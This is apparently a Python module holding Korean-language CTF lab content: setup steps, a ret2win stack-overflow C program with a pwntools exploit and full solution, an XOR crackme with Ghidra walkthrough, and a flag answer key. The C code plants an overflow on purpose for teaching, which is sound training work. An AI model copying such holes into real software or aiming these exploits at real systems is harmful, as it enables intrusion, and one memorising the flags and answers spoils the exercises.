"""Pwn/Reverse 실습실 콘텐츠.

취약점 스캐너의 CTF 준비 가이드가 "Pwn/Reverse는 실제 바이너리 실습이 필요하다"고
안내하는 부분을 실제로 채우기 위한 모듈. 여기서는 텍스트 분석이 아니라 진짜
컴파일 가능한 C 소스와 gdb/Ghidra 사용 절차, 힌트, 모범 답안을 제공한다.

FLAGS는 CHALLENGES와 분리해 둔다 — /challenges 응답에는 포함하지 않고,
/verify 엔드포인트에서 서버 측 비교에만 사용해 네트워크 탭만 봐서는 정답을
알 수 없게 한다 (그래도 소스 코드 자체는 공개하므로, crackme의 경우 인코딩된
바이트를 실제로 XOR 디코딩해야 답을 알 수 있다 — 이게 리버싱 연습의 핵심이다).
"""

DOCKERFILE = """FROM ubuntu:22.04

RUN apt-get update && apt-get install -y --no-install-recommends \\
        build-essential gdb gdbserver python3 python3-pip git curl ca-certificates \\
    && pip3 install --no-cache-dir pwntools \\
    && git clone --depth 1 https://github.com/pwndbg/pwndbg /opt/pwndbg \\
    && cd /opt/pwndbg && ./setup.sh \\
    && apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /lab
CMD ["/bin/bash"]
"""

LAB_SETUP = {
    "title": "0단계: 실습 환경 먼저 준비하기 (Docker 또는 WSL + Ghidra)",
    "intro": (
        "gdb/pwndbg는 리눅스 환경이 필요합니다. 아래 두 방법 중 하나로 리눅스 셸을 준비한 뒤 "
        "챌린지를 시작하세요. 둘 다 준비할 필요는 없고, 편한 쪽 하나만 끝까지 따라가면 됩니다."
    ),
    "prereq_checklist": [
        "Windows 10(버전 2004 이상) 또는 Windows 11 확인 (이 항목은 이미 대부분 충족됩니다)",
        "방법 A(Docker) 또는 방법 B(WSL) 중 하나를 선택",
        "선택한 방법대로 환경을 준비하고 아래 확인 명령으로 정상 작동을 검증",
        "실습 도구(gcc, gdb, pwntools, pwndbg) 설치 확인",
    ],
    "which_to_choose": (
        "Docker: 컨테이너를 매번 새로 띄우므로 실습 환경을 깨끗한 상태로 재현하기 쉽습니다. "
        "이미 Docker Desktop이 설치되어 있다면 가장 빠른 선택지입니다.\n"
        "WSL 네이티브: 한 번 설치해두면 도구가 계속 남아있고, VS Code의 WSL 확장과 연동하기 편합니다. "
        "둘 다 결국 '리눅스 셸에서 gcc/gdb를 쓴다'는 점은 동일합니다."
    ),
    "docker_path": {
        "title": "방법 A: Docker Desktop으로 실습 환경 켜기",
        "steps": [
            "Windows 검색(돋보기)에서 'Docker Desktop'을 입력해 실행합니다.",
            "최초 실행이라면 이용약관에 동의하고, 'Use WSL 2 based engine' 옵션은 기본값(체크됨)을 그대로 둡니다.",
            "시스템 트레이(작업표시줄 오른쪽)의 고래 아이콘이 움직이다가 멈추고 'Docker Desktop is running' 상태가 될 때까지 기다립니다 (수십 초~1분).",
            "터미널에서 docker info 를 실행해 에러 없이 정보가 출력되면 데몬이 켜진 것입니다. ('cannot connect' 에러가 나오면 아직 켜지는 중이거나 실행되지 않은 것입니다.)",
            "(선택) Docker Desktop 설정(Settings) → General → 'Start Docker Desktop when you log in' 체크 — 매번 수동 실행하지 않아도 됩니다.",
            "이 페이지에서 Dockerfile을 다운로드해 챌린지 소스 파일들과 같은 폴더에 저장합니다.",
            "그 폴더에서: docker build -t pwnlab .   (최초 1회, 이미지 빌드에 몇 분 걸릴 수 있음)",
            "docker run --rm -it -v \"$(pwd)\":/lab pwnlab   (컨테이너 실행, 현재 폴더가 /lab에 마운트됨)",
            "컨테이너 프롬프트가 뜨면 준비 완료 — cd /lab 후 각 챌린지의 빌드 명령을 그대로 실행하면 됩니다.",
        ],
        "troubleshooting": [
            "'WSL 2 installation is incomplete' 오류: 관리자 권한 PowerShell에서 wsl --update 실행 후 Docker Desktop을 다시 시작하세요.",
            "가상화 관련 오류: BIOS/UEFI에서 가상화 기능(Intel VT-x 또는 AMD-V)이 꺼져 있을 수 있습니다. 재부팅 후 BIOS 진입(보통 Del 또는 F2)해 활성화하세요.",
            "고래 아이콘이 계속 로딩 중이라면 Windows를 완전히 재부팅한 뒤 다시 시도해보세요.",
        ],
    },
    "wsl_path": {
        "title": "방법 B: WSL에 리눅스 배포판 직접 설치하기",
        "steps": [
            "시작 메뉴에서 PowerShell을 검색해 '관리자 권한으로 실행'합니다.",
            "wsl --install -d Ubuntu-22.04 를 입력합니다. (WSL 기능 자체는 이미 활성화되어 있는 경우가 많아 배포판만 받으면 되는 경우가 대부분입니다. 다른 배포판 목록은 wsl --list --online 으로 확인할 수 있고, 펜테스트 도구가 미리 담긴 kali-linux 를 선택해도 됩니다.)",
            "설치가 끝나면 재부팅이 필요할 수 있습니다. 재부팅 후 Ubuntu 터미널이 자동으로 열리며 리눅스용 사용자명/비밀번호 설정을 요구합니다 (Windows 계정과 무관하게 새로 정하면 됩니다).",
            "확인: PowerShell에서 wsl --list --verbose 실행 — Ubuntu-22.04가 목록에 있고 VERSION이 2인지 확인합니다.",
            "이후로는 아무 터미널에서 wsl 만 입력하면 바로 Ubuntu 셸로 들어갈 수 있습니다.",
            "Ubuntu 셸 안에서 실습 도구를 설치합니다:\nsudo apt update\nsudo apt install -y build-essential gdb gdbserver python3 python3-pip git\npip3 install pwntools\ngit clone --depth 1 https://github.com/pwndbg/pwndbg ~/pwndbg\ncd ~/pwndbg && ./setup.sh",
            "다운로드한 챌린지 소스 파일은 WSL 파일시스템 안으로 복사해서 쓰는 것을 권장합니다 (성능·권한 문제 예방): cp -r /mnt/c/Users/<사용자명>/Downloads/pwn-lab ~/pwn-lab",
        ],
        "troubleshooting": [
            "'wsl' 명령을 찾을 수 없다는 오류: Windows 업데이트가 오래된 경우입니다. Microsoft Store에서 'Windows 터미널'을 설치하고 최신 Windows 업데이트를 적용하세요.",
            "설치 중 '이 배포판은 이미 설치되어 있습니다' 메시지가 나오면 wsl --list --verbose 로 이미 설치된 배포판인지 먼저 확인하세요.",
            "느리다면 챌린지 파일이 /mnt/c/... (Windows 파일시스템) 경로에 있기 때문일 수 있습니다 — WSL 홈 디렉토리(~/)로 복사해서 작업하면 훨씬 빠릅니다.",
        ],
    },
    "dockerfile": DOCKERFILE,
    "ghidra_note": (
        "Ghidra는 GUI 프로그램이라 Docker/WSL보다 Windows에 직접 설치하는 것을 권장합니다. "
        "NSA가 공개한 오픈소스 리버싱 도구로 github.com/NationalSecurityAgency/ghidra 에서 "
        "릴리스를 받을 수 있습니다. Java(JDK 17+)가 필요하며, 설치 후 File → Import File로 "
        "컴파일된 바이너리를 불러오고 기본 옵션으로 Auto Analyze를 실행하면 됩니다."
    ),
}

CHALLENGES = [
    {
        "id": "pwn-ret2win",
        "category": "pwn",
        "title": "ret2win: 스택 버퍼 오버플로우로 숨겨진 함수 호출하기",
        "difficulty": "입문",
        "tool_focus": "gdb",
        "situation": (
            "바이너리 안에는 절대 호출되지 않는 win() 함수가 숨어 있습니다. 사용자 입력을 받는 "
            "vulnerable() 함수는 64바이트 버퍼에 256바이트까지 읽어들여 스택 버퍼 오버플로우가 "
            "발생합니다. 이 취약점으로 실행 흐름을 win()으로 돌려 flag를 출력시키는 것이 목표입니다."
        ),
        "objective": "gdb로 크래시 지점을 찾고, 정확한 오프셋을 계산해 return address를 win()의 주소로 덮어써 봅니다.",
        "source_filename": "ret2win.c",
        "source_code": """// ret2win.c — PWN 101: 기본 스택 버퍼 오버플로우
// gcc -fno-stack-protector -no-pie -o ret2win ret2win.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    printf("\\n[+] Correct! Here is your flag:\\n");
    printf("PWN{r3t2w1n_st4ck_sm4sh1ng_101}\\n");
    fflush(stdout);
}

void vulnerable(void) {
    char buffer[64];
    printf("Enter your name: ");
    fflush(stdout);
    read(0, buffer, 256);   // buffer는 64바이트인데 256바이트까지 읽음 -> 오버플로우
    printf("Hello, %s! Nice to meet you.\\n", buffer);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ret2win warmup ===\\n");
    printf("There's a hidden win() function somewhere in this binary...\\n");
    vulnerable();
    printf("Goodbye.\\n");
    return 0;
}
""",
        "build_steps": [
            "위 소스를 ret2win.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경(Docker 컨테이너 또는 WSL) 안에서: gcc -fno-stack-protector -no-pie -o ret2win ret2win.c",
            "-fno-stack-protector: 스택 카나리 비활성화 (입문 단계에서는 카나리 우회까지 배우지 않도록), -no-pie: 실행할 때마다 주소가 바뀌지 않도록 고정 (오프셋 계산에 집중하기 위함)",
            "file ./ret2win 로 64비트 ELF인지 확인, (pwntools가 있다면) checksec --file=ret2win 로 어떤 보호기법이 꺼져 있는지 확인합니다.",
        ],
        "analysis_steps": [
            "objdump -d ret2win | grep -A2 '<win>:' 로 win() 함수의 시작 주소를 확인합니다.",
            "gdb ./ret2win 으로 실행한 뒤 python3 -c \"from pwn import *; print(cyclic(200))\" 으로 만든 패턴을 입력값으로 줍니다.",
            "프로그램이 세그폴트로 죽으면 gdb에서 info registers 로 rip(또는 다음 실행될 주소가 저장된 스택 위치)를 확인합니다.",
            "python3 -c \"from pwn import *; print(cyclic_find(0x<크래시난값>))\" 으로 정확한 오프셋을 계산합니다.",
            "오프셋만큼 채운 뒤 win() 주소를 8바이트 리틀엔디언으로 이어붙인 payload를 다시 넣어 flag가 출력되는지 확인합니다.",
        ],
        "hints": [
            "win()은 main에서 절대 호출되지 않습니다 — objdump나 Ghidra의 Symbol Tree에서 이름으로 직접 찾아야 합니다.",
            "read(0, buffer, 256)에서 버퍼 크기(64)보다 훨씬 큰 256을 읽기 때문에 입력 길이 제한이 사실상 없습니다.",
            "cyclic() 패턴은 4~8바이트 단위로 겹치지 않는 문자열이라, 크래시난 주소값 하나만 알면 정확한 오프셋을 역산할 수 있습니다.",
            "x86-64에서 buffer[64] 바로 다음엔 저장된 rbp(8바이트)가 있고 그 다음이 return address이므로, 오프셋은 대략 72 근처인 경우가 많습니다 — 그래도 반드시 cyclic_find로 직접 확인하세요 (컴파일러/OS에 따라 달라질 수 있습니다).",
        ],
        "exploit_template": """#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2win')
p = process('./ret2win')

# 1) 먼저 gdb + cyclic(200)으로 오프셋을 직접 확인하세요.
OFFSET = None  # TODO: gdb에서 cyclic_find로 확인한 값으로 교체 (예: 72 근처)

win_addr = elf.symbols['win']
log.info(f"win() address: {hex(win_addr)}")

payload = b'A' * OFFSET + p64(win_addr)

p.send(payload)
p.interactive()
""",
        "solution": """1. gcc -fno-stack-protector -no-pie -o ret2win ret2win.c 로 빌드합니다.
2. objdump -d ret2win | grep -A2 '<win>:' 로 win() 주소를 확인합니다 (예: 0x401196 — 실제 값은 환경마다 다릅니다).
3. gdb ./ret2win 실행 후 run 하고, python3 -c "from pwn import *; print(cyclic(200))" 결과를 입력합니다.
4. 세그폴트 후 info registers 로 다음 실행 주소로 쓰이려던 값을 확인하고,
   python3 -c "from pwn import *; print(cyclic_find(0xVALUE))" 로 정확한 오프셋을 구합니다.
5. 아래처럼 exploit.py를 작성해 실행하면 flag가 출력됩니다.

from pwn import *
context.binary = elf = ELF('./ret2win')
p = process('./ret2win')
OFFSET = 72  # 3~4단계에서 직접 구한 값으로 교체
payload = b'A' * OFFSET + p64(elf.symbols['win'])
p.send(payload)
p.interactive()
""",
    },
    {
        "id": "reverse-crackme",
        "category": "reverse",
        "title": "crackme v1: Ghidra로 비밀번호 로직 분석하기",
        "difficulty": "입문",
        "tool_focus": "ghidra",
        "situation": (
            "비밀번호를 입력받아 맞으면 flag를 출력하는 프로그램입니다. 소스 없이 컴파일된 "
            "바이너리만 주어졌다고 가정하고, Ghidra로 디컴파일해 올바른 비밀번호를 알아내는 것이 목표입니다."
        ),
        "objective": "Ghidra의 디컴파일러로 check() 함수의 로직(XOR 비교)을 읽고, 인코딩된 바이트를 직접 디코딩해 정답을 찾아봅니다.",
        "source_filename": "crackme.c",
        "source_code": """// crackme.c — REVERSE 101: XOR 인코딩 크랙미
// gcc -no-pie -o crackme crackme.c
#include <stdio.h>
#include <string.h>

static int check(const char *input) {
    static const unsigned char encoded[] = {
        0x0c, 0x23, 0x7a, 0x2f, 0x39, 0x2a, 0x14, 0x1b, 0x39, 0x7b, 0x6a, 0x6a
    };
    static const unsigned char key = 0x4b;
    size_t len = sizeof(encoded);

    if (strlen(input) != len) {
        return 0;
    }
    for (size_t i = 0; i < len; i++) {
        if ((unsigned char)(input[i] ^ key) != encoded[i]) {
            return 0;
        }
    }
    return 1;
}

int main(void) {
    char input[128];
    printf("=== crackme v1 ===\\n");
    printf("Enter the password: ");
    fflush(stdout);
    if (scanf("%127s", input) != 1) {
        return 1;
    }
    if (check(input)) {
        printf("Access granted!\\n");
        printf("RE{gh1dra_and_x0r_ar3_fr1ends}\\n");
    } else {
        printf("Access denied.\\n");
    }
    return 0;
}
""",
        "build_steps": [
            "위 소스를 crackme.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경 안에서: gcc -no-pie -o crackme crackme.c",
            "실전에서는 소스 없이 바이너리 파일(crackme)만 Ghidra에 넣는다고 가정하고 진행하세요.",
        ],
        "analysis_steps": [
            "Ghidra에서 File → New Project → 바이너리(crackme)를 Import 합니다.",
            "더블클릭해 CodeBrowser를 열고, 'Analyze this file now?'에 Yes를 눌러 기본 옵션으로 분석합니다.",
            "왼쪽 Symbol Tree에서 Functions → main을 찾아 오른쪽 Decompile 창에서 로직을 읽습니다.",
            "main이 호출하는 check() 함수로 이동해, 반복문 안의 XOR 연산과 고정된 바이트 배열을 확인합니다.",
            "배열 값과 key를 옮겨 적은 뒤, Python으로 각 바이트를 key와 XOR해 원래 문자열(비밀번호)을 복원합니다.",
            "복원한 비밀번호를 실제로 crackme를 실행해 입력하고 flag가 출력되는지 확인합니다.",
        ],
        "hints": [
            "Ghidra 디컴파일 결과에서 check() 함수 안에 unsigned char 배열과 반복문이 보일 것입니다.",
            "반복문 안에서 input[i] ^ key 값을 encoded[i]와 비교합니다 — 즉 encoded[i] ^ key 가 원래 문자입니다.",
            "XOR는 같은 키로 두 번 연산하면 원래 값으로 돌아옵니다: (byte ^ key) ^ key == byte.",
            "배열 전체를 key와 XOR한 뒤 각 값을 아스키 문자로 바꾸면 비밀번호 문자열이 나옵니다.",
        ],
        "solution": """1. gcc -no-pie -o crackme crackme.c 로 빌드합니다.
2. Ghidra로 crackme를 Import → Auto Analyze → main() 디컴파일을 확인합니다.
3. main이 check()를 호출하는 것을 확인하고 check() 디컴파일을 엽니다.
4. 아래와 같은 배열과 key, XOR 비교 로직이 보입니다:
   encoded = {0x0c,0x23,0x7a,0x2f,0x39,0x2a,0x14,0x1b,0x39,0x7b,0x6a,0x6a}, key = 0x4b
5. 파이썬으로 디코딩합니다:

   encoded = [0x0c,0x23,0x7a,0x2f,0x39,0x2a,0x14,0x1b,0x39,0x7b,0x6a,0x6a]
   key = 0x4b
   password = ''.join(chr(b ^ key) for b in encoded)
   print(password)  # Gh1dra_Pr0!!

6. ./crackme 를 실행해 'Gh1dra_Pr0!!'를 입력하면 flag가 출력됩니다.
""",
    },
]

FLAGS = {
    "pwn-ret2win": "PWN{r3t2w1n_st4ck_sm4sh1ng_101}",
    "reverse-crackme": "RE{gh1dra_and_x0r_ar3_fr1ends}",
}


def get_challenge(challenge_id: str) -> dict | None:
    return next((c for c in CHALLENGES if c["id"] == challenge_id), None)
